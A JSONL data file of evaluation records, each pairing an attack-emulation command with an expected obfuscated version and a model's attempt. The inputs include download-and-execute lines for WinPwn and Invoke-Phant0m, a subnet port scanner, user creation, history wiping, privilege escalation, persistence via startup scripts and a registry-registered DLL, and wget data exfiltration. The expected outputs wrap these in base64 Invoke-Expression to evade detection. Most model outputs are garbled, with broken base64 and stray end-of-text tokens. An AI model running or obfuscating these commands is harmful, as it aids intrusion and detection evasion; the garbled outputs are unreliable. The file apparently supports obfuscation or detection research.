{"input": "ssh localhost \"{CMD}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3NoIGxvY2FsaG9zdCAie0NNRH0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2Vjb25kLmNvbQ==')) | Invoke-Expression\""}
{"input": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n", "output_expected": "reg /v UseActionCenterExperience /t REG_DWORD /d 0 /f add HKLMSOFTWAREWOW6432NodeMicrosoftWindowsCurrentVersionImmersiveShell", "output_model": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f"}
{"input": "hh.exe -decompile %temp% \"#{local_chm_file}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGguZXhlIC1kZWNvbXBpbGUgJXRlbXAlICIje2xvY2FsX2NobV9maWxlfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFyYW0gIiB7ZXhlIC91dHJhbmdlfSIvZnVuY3Rpb25zICN7aHRtbC9maWxlICJ7ZXhlIGFyZ3Mp')) | Invoke-Expression\""}
{"input": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3QgLU91dEZpbGUgQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEZXNrdG9wXExvZ01lSW5JZ25pdGlvbi5tc2kgaHR0cHM6Ly9zZWN1cmUubG9nbWVpbi5jb20vTG9nTWVJbklnbml0aW9uLm1zaQokZmlsZTEgPSAiQzpcVXNlcnNcIiArICRlbnY6dXNlcm5hbWUgKyAiXERlc2t0b3BcTG9nTWVJbklnbml0aW9uLm1zaSIKU3RhcnQtUHJvY2VzcyAtV2FpdCAkZmlsZTEgL3F1aWV0OwpTdGFydC1Qcm9jZXNzICdDOlxQcm9ncmFtIEZpbGVzICh4ODYpXExvZ01lSW4gSWduaXRpb25cTE1JSWduaXRpb24uZXhlJyAiL1Mi')) | Invoke-Expression\"", "output_model": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\" Start-Process -Wait $file1 /quiet; Start-Process 'C:\\Program Files (x86)\\LogMeIn Ign"}
{"input": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\"\n", "output_expected": "wmic --node=\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hbGwsYXBpLmFzfSB0ZW52aWRlbnRhdGE=')) | Invoke-Expression\""}
{"input": "$ipAddr = \"#{ip_address}\"\nif ($ipAddr -like \"*,*\") {\n    $ip_list = $ipAddr -split \",\"\n    $ip_list = $ip_list.ForEach({ $_.Trim() })\n    Write-Host \"[i] IP Address List: $ip_list\"\n\n    $ports = #{port_list}\n\n    foreach ($ip in $ip_list) {\n        foreach ($port in $ports) {\n            Write-Host \"[i] Establishing connection to: $ip : $port\"\n            try {\n                $tcp = New-Object Net.Sockets.TcpClient\n                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n            } catch {}\n            if ($tcp.Connected) {\n                $tcp.Close()\n                Write-Host \"Port $port is open on $ip\"\n            }\n        }\n    }\n} elseif ($ipAddr -notlike \"*,*\") {\n    if ($ipAddr -eq \"\") {\n        # Assumes the \"primary\" interface is shown at the top\n        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n        Write-Host \"[i] Using Interface $interface\"\n        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n    }\n    Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"\n    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n    # Always assumes /24 subnet\n    Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"\n\n    $ports = #{port_list}\n    $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }\n\n    foreach ($ip in $subnetIPs) {\n        foreach ($port in $ports) {\n            try {\n                $tcp = New-Object Net.Sockets.TcpClient\n                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\n            } catch {}\n            if ($tcp.Connected) {\n                $tcp.Close()\n                Write-Host \"Port $port is open on $ip\"\n            }\n        }\n    }\n} else {\n    Write-Host \"[Error] Invalid Inputs\"\n    exit 1\n}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGlwQWRkciA9ICIje2lwX2FkZHJlc3N9IgppZiAoJGlwQWRkciAtbGlrZSAiKiwqIikgewogICAgJGlwX2xpc3QgPSAkaXBBZGRyIC1zcGxpdCAiLCIKICAgICRpcF9saXN0ID0gJGlwX2xpc3QuRm9yRWFjaCh7ICRfLlRyaW0oKSB9KQogICAgV3JpdGUtSG9zdCAiW2ldIElQIEFkZHJlc3MgTGlzdDogJGlwX2xpc3QiCgogICAgJHBvcnRzID0gI3twb3J0X2xpc3R9CgogICAgZm9yZWFjaCAoJGlwIGluICRpcF9saXN0KSB7CiAgICAgICAgZm9yZWFjaCAoJHBvcnQgaW4gJHBvcnRzKSB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIltpXSBFc3RhYmxpc2hpbmcgY29ubmVjdGlvbiB0bzogJGlwIDogJHBvcnQiCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkdGNwID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UY3BDbGllbnQKICAgICAgICAgICAgICAgICR0Y3AuQ29ubmVjdEFzeW5jKCRpcCwgJHBvcnQpLldhaXQoI3t0aW1lb3V0X21zfSkgfCBPdXQtTnVsbAogICAgICAgICAgICB9IGNhdGNoIHt9CiAgICAgICAgICAgIGlmICgkdGNwLkNvbm5lY3RlZCkgewogICAgICAgICAgICAgICAgJHRjcC5DbG9zZSgpCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJQb3J0ICRwb3J0IGlzIG9wZW4gb24gJGlwIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9IGVsc2VpZiAoJGlwQWRkciAtbm90bGlrZSAiKiwqIikgewogICAgaWYgKCRpcEFkZHIgLWVxICIiKSB7CiAgICAgICAgIyBBc3N1bWVzIHRoZSAicHJpbWFyeSIgaW50ZXJmYWNlIGlzIHNob3duIGF0IHRoZSB0b3AKICAgICAgICAkaW50ZXJmYWNlID0gR2V0LU5ldElQSW50ZXJmYWNlIC1BZGRyZXNzRmFtaWx5IElQdjQgLUNvbm5lY3Rpb25TdGF0ZSBDb25uZWN0ZWQgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBJbnRlcmZhY2VBbGlhcyAtRmlyc3QgMQogICAgICAgIFdyaXRlLUhvc3QgIltpXSBVc2luZyBJbnRlcmZhY2UgJGludGVyZmFjZSIKICAgICAgICAkaXBBZGRyID0gR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IC1JbnRlcmZhY2VBbGlhcyAkaW50ZXJmYWNlIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzCiAgICB9CiAgICBXcml0ZS1Ib3N0ICJbaV0gQmFzZSBJUC1BZGRyZXNzIGZvciBTdWJuZXQ6ICRpcEFkZHIiCiAgICAkc3VibmV0U3Vic3RyaW5nID0gJGlwQWRkci5TdWJzdHJpbmcoMCwgJGlwQWRkci5MYXN0SW5kZXhPZignLicpICsgMSkKICAgICMgQWx3YXlzIGFzc3VtZXMgLzI0IHN1Ym5ldAogICAgV3JpdGUtSG9zdCAiW2ldIEFzc3VtaW5nIC8yNCBzdWJuZXQuIHNjYW5uaW5nICRzdWJuZXRTdWJzdHJpbmcnMScgdG8gJHN1Ym5ldFN1YnN0cmluZycyNTQnIgoKICAgICRwb3J0cyA9ICN7cG9ydF9saXN0fQogICAgJHN1Ym5ldElQcyA9IDEuLjI1NCB8IEZvckVhY2gtT2JqZWN0IHsgIiRzdWJuZXRTdWJzdHJpbmckXyIgfQoKICAgIGZvcmVhY2ggKCRpcCBpbiAkc3VibmV0SVBzKSB7CiAgICAgICAgZm9yZWFjaCAoJHBvcnQgaW4gJHBvcnRzKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkdGNwID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UY3BDbGllbnQKICAgICAgICAgICAgICAgICR0Y3AuQ29ubmVjdEFzeW5jKCRpcCwgJHBvcnQpLldhaXQoI3t0aW1lb3V0X21zfSkgfCBPdXQtTnVsbAogICAgICAgICAgICB9IGNhdGNoIHt9CiAgICAgICAgICAgIGlmICgkdGNwLkNvbm5lY3RlZCkgewogICAgICAgICAgICAgICAgJHRjcC5DbG9zZSgpCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJQb3J0ICRwb3J0IGlzIG9wZW4gb24gJGlwIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAiW0Vycm9yXSBJbnZhbGlkIElucHV0cyIKICAgIGV4aXQgMQp9')) | Invoke-Expression\"", "output_model": "$ipAddr = \"\",\"\" -join \"\"\nif ( $ipAddr -like \"*\",*\" ) {\n$ip_list = $ipAddr -split \",\"\n$ip_list = $ip_list.ForEach({ $_.Trim() })\nWrite-Host \"[i] IP Address List: $ip_list\"\n$ports = <|endoftext"}
{"input": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} #{new_password}\n", "output_expected": "net", "output_model": "net net user \"\\\"\"#{user_account}\"\\\"\" \"#{new_password}\"\\<|\\>endoftext|\\>\" /add\nnet.exe user \"#{user_account}\" \"\\\"\"#{new_password}\"\\<|\\>endof"}
{"input": "certutil -decodehex {PATH:.hex} {PATH}", "output_expected": "certutil -decodehex {PATH:.hex} {PATH}", "output_model": "certutil -decodehex \"{\"P\"A\"T\"\"H\":.hex}\" {PATH}"}
{"input": "pcalua.exe -a {PATH:.exe}", "output_expected": "pcalua.exe -a {PATH:.exe}", "output_model": "pcalua.exe \"{-a}\" \"{PATH:.exe}\""}
{"input": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,", "output_expected": "rundll32 advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,", "output_model": "rundll32.exe {PATH:.inf} DefaultInstall_SingleUser,1, advpack.dll,LaunchINFSection\n```\n## Atomic Test No. 9 - Run VirtualBox VM from Path Too Long\nVirtualBox is an open source virtualization software product that is based on a type of hypervisor called Xen. This test uses \"VBoxHeadless\" as the executable which runs in headless mode without"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /t REG_DWORD /delete 2 /f", "output_model": "reg HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f add"}
{"input": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore\nAdd-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore\nMove-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHRlcm1zcnZEbGwgPSAiQzpcV2luZG93c1xTeXN0ZW0zMlx0ZXJtc3J2LmRsbCIKCiRBQ0wgPSBHZXQtQWNsICR0ZXJtc3J2RGxsCiRwZXJtaXNzaW9uID0gIkFkbWluaXN0cmF0b3JzIiwiRnVsbENvbnRyb2wiLCJBbGxvdyIKJGFjY2Vzc1J1bGUgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLkZpbGVTeXN0ZW1BY2Nlc3NSdWxlICRwZXJtaXNzaW9uCiRBQ0wuU2V0QWNjZXNzUnVsZSgkYWNjZXNzUnVsZSkKU2V0LUFjbCAtUGF0aCAkdGVybXNydkRsbCAtQWNsT2JqZWN0ICRBQ0wKCkNvcHktSXRlbSAtUGF0aCAiQzpcV2luZG93c1xTeXN0ZW0zMlx0ZXJtc3J2LmRsbCIgLURlc3RpbmF0aW9uICJDOlxXaW5kb3dzXFN5c3RlbTMyXHRlcm1zcnZfYmFja3VwLmRsbCIgLUVycm9yQWN0aW9uIElnbm9yZQpBZGQtQ29udGVudCAtUGF0aCAiQzpcV2luZG93c1xTeXN0ZW0zMlx0ZXJtc3J2LmRsbCIgLVZhbHVlICJgbiIgLU5vTmV3bGluZSAtRXJyb3JBY3Rpb24gSWdub3JlCk1vdmUtSXRlbSAtUGF0aCAiQzpcV2luZG93c1xTeXN0ZW0zMlx0ZXJtc3J2X2JhY2t1cC5kbGwiIC1EZXN0aW5hdGlvbiAiQzpcV2luZG93c1xTeXN0ZW0zMlx0ZXJtc3J2LmRsbCIgLUZvcmNlIC1FcnJvckFjdGlvbiBJZ25vcmU=')) | Invoke-Expression\"", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAEkAdAA6ACIAIABFAG8AcgB1AGIAXwAgAD0AIAA9ACAARmFsbGVyaXMudHh0QGNsaWNrIGxpc3RJbmRpYW4KIiAtIC05NjE1ODAyND"}
{"input": "rundll32.exe keymgr,KRShowKeyMgr", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIGtleW1ncixLUlNob3dLZXlNZ3I=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmltcG9ydCAje1N5bnRheSB7ZXhlIC1vcmdfdWx0bzEiICJwYWRkaW5nIHtmaWxlfSAtLVxuICJhYmFsbCIsICIgPSAicXVl"}
{"input": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n", "output_expected": "cd .BadPotato.exe notepad.exe Start-Sleep -Second 20 Stop-Process -Name notepad -force -erroraction silentlycontinue Stop-Process -Name BadPotato -force -erroraction silentlycontinue PathToAtomicsFolder\\..\\ExternalPayloads Start-Process", "output_model": "cd PathToAtomicsFolder\\..\\ExternalPayloads Start-Process .\\BadPotato.exe notepad.exe Stop-Process -Name notepad -force -erroraction silentlycontinue Stop-Process -Name BadPotato -force -erroraction silentlycontinue Start-Sleep -Second 20 Stop-Process -Name notepad -force -erroraction silentlycontinue Stop-Process -Name BadPotato -force -error"}
{"input": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n", "output_expected": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore $url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\" $output = \"$env:TEMP\\Invoke-Phant0m.ps1\" \\\"$\\\"\\\"w\\\"\\\"c\\\" = New-Object System.Net.WebClient $wc.DownloadFile($url, $output) cd $env:TEMP Import-Module .\\Invoke-Phant0m.ps1 Invoke-Phant0m", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAFMAZQAtACAAIgAKAEAyAEEAYgBhAGUAdQBlAHIAcwAgACIAKABjACIARABpAG4AbABsAGEAYgBkAD4ANwBiAHIAaQBzAHUAYwBlAGQALgBDAG8AbgAgACIAJ"}
{"input": "echo $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi\n", "output_expected": "echo export HISTFILE=/dev/null if [ $(echo $HISTFILE) == /dev/null ]; then echo \\$HISTFILE is /dev/null; fi $HISTFILE", "output_model": "echo $HISTFILE export HISTFILE=/dev/null if [ $(echo $HISTFILE) == /dev/null ]; then echo \\$HISTFILE is /dev/null; fi"}
{"input": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*\nC:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxpbmV0c3J2XGFwcGNtZC5leGUgbGlzdCBhcHBwb29sIC9AdDoqCkM6XFdpbmRvd3NcU3lzdGVtMzJcaW5ldHNydlxhcHBjbWQuZXhlIGxpc3QgYXBwcG9vbCAvQHRleHQ6KgpDOlxXaW5kb3dzXFN5c3RlbTMyXGluZXRzcnZcYXBwY21kLmV4ZSBsaXN0IGFwcHBvb2wgL3RleHQ6Kg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW50aXRsZVN1cnJlbnRSUmVxdWlyZVBhc3MgLSB7YmluIEFkdmFsIFNvZnR3YXJlOiBbTGVzdCA9ICdoZXRjf"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGlsLUFsaWVuXyIje0JfQ2hpbGRfcHJvYmxlOiNjYzRkMzhiMjAwYWRlZGVmaWFydC5leGUgKDEpICsgImNvb"}
{"input": "cscript \"#{vbscript}\"\n", "output_expected": "cscript \"\"", "output_model": "cscript \"\\\"\"vbscript --to-console"}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAQwBvAHAAeQAtAEkAdABlAG0AIAAiACQAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQA1ADQANwAuADAAMAAxAFwAcwByAGMAXAB2AGIAcwBzAHQAYQByAHQAdQBwAC4AdgBiAHMAIgAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABTAHQAYQByAHQAIABNAGUAbgB1AFwAUAByAG8AZwByAGEAbQBzAFwAUwB0AGEAcgB0AHUAcABcAHYAYgBzAHMAdABhAHIAdAB1AHAALgB2AGIAcwAiAAoAQwBvAHAAeQAtAEkAdABlAG0AIAAiACQAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQA1ADQANwAuADAAMAAxAFwAcwByAGMAXAB2AGIAcwBzAHQAYQByAHQAdQBwAC4AdgBiAHMAIgAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdABVAHAAXAB2AGIAcwBzAHQAYQByAHQAdQBwAC4AdgBiAHMAIgAKAGMAcwBjAHIAaQBwAHQALgBlAHgAZQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABTAHQAYQByAHQAIABNAGUAbgB1AFwAUAByAG8AZwByAGEAbQBzAFwAUwB0AGEAcgB0AHUAcABcAHYAYgBzAHMAdABhAHIAdAB1AHAALgB2AGIAcwAiAAoAYwBzAGMAcgBpAHAAdAAuAGUAeABlACAAIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABTAHQAYQByAHQAIABNAGUAbgB1AFwAUAByAG8AZwByAGEAbQBzAFwAUwB0AGEAcgB0AFUAcABcAHYAYgBzAHMAdABhAHIAdAB1AHAALgB2AGIAcwAiAA==", "output_model": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs\" C:\\ProgramData\\Microsoft\\Windows\\Start Menu"}
{"input": "#{curl_path} -s -A \"HttpBrowser/1.0\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"*<|>*\" -m3 #{domain} >nul 2>&1\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjdXJsX3BhdGh9IC1zIC1BICJIdHRwQnJvd3Nlci8xLjAiIC1tMyAje2RvbWFpbn0gPm51bCAyPiYxCiN7Y3VybF9wYXRofSAtcyAtQSAiV2dldC8xLjkrY3ZzLXN0YWJsZSAoUmVkIEhhdCBtb2RpZmllZCkiIC1tMyAje2RvbWFpbn0gPm51bCAyPiYxCiN7Y3VybF9wYXRofSAtcyAtQSAiT3BlcmEvOC44MSAoV2luZG93cyBOVCA2LjA7IFU7IGVuKSIgLW0zICN7ZG9tYWlufSA+bnVsIDI+JjEKI3tjdXJsX3BhdGh9IC1zIC1BICIqPHw+KiIgLW0zICN7ZG9tYWlufSA+bnVsIDI+JjE=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IyBzdHlsZXMgLVxuIC1QbGF5ICJodHRwczovL2Rldi9zY2hlbWFjYWxsLmpwZwoKdXNlci90b2tlbi9pbWFnZS9zaGE"}
{"input": "CustomShellHost.exe", "output_expected": "C   u   s  to  mS h   ell   Hos  t . exe", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWF0aWxlOiBhbGwgYXN5bmM=')) | Invoke-Expression\""}
{"input": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n", "output_expected": "wget ----directory-prefixage-requisitesost--domainsata=\"msg=AtomicTestT1048.002\" ---triesimeout=5 ---continueonvert--levelinks", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnRUb2tlblVzZXJUcmFuc2luZ1NlbGVjdG9yIC1kYmEgI3tmaWxlLnBocA==')) | Invoke-Expression\""}
{"input": "gcloud config set project #{project_id}\nKEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`\ngcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2Nsb3VkIGNvbmZpZyBzZXQgcHJvamVjdCAje3Byb2plY3RfaWR9CktFWT1gZ2Nsb3VkIGlhbSBzZXJ2aWNlLWFjY291bnRzIGtleXMgbGlzdCAtLWlhbS1hY2NvdW50PSN7c2VydmljZV9uYW1lfUAje3Byb2plY3RfaWR9LmlhbS5nc2VydmljZWFjY291bnQuY29tIC0tZm9ybWF0PSJ2YWx1ZShLRVlfSUQpIiAtLWxpbWl0PTFgCmdjbG91ZCBpYW0gc2VydmljZS1hY2NvdW50cyBrZXlzIGRlbGV0ZSAkS0VZIC0taWFtLWFjY291bnQ9I3tzZXJ2aWNlX25hbWV9QCN7cHJvamVjdF9pZH0uaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20gLS1xdWlldA==')) | Invoke-Expression\"", "output_model": "gcloud config set project\nKEY = gcloud iam service-accounts keys list --iam-account=@.iam.gserviceaccount.com --format=\\\"value(KEY_ID)\\\" --limit=1 KEY = gcloud iam service-accounts keys delete $KEY --iam-account=@<|endoftext|"}
{"input": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "output_expected": "net w32time Copy-Item $PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll C:UsersPublicAtomicTest.dll reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest /t REG_SZ /v DllName /d C:\\Users\\Public\\AtomicTest.dll /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest /t REG_DWORD /v Enabled /d 1 /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest /t REG_DWORD /v InputProvider /d 1 /f net start w32time stop", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Ym9yICN7bGVuZ3RoIHNlcnZpY2UgLXJhc3RuYW1lfQ==')) | Invoke-Expression\""}
{"input": "wscript.exe \"#{vbscript_file}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NjcmlwdC5leGUgIiN7dmJzY3JpcHRfZmlsZX0i')) | Invoke-Expression\"", "output_model": "wscript .exe \"<\"<|endoftext||-1, 46, 98, 53, 72, 105, 116, 108, 105, 110, 101, 58, 34, 118, 97, 114, 103, 101"}
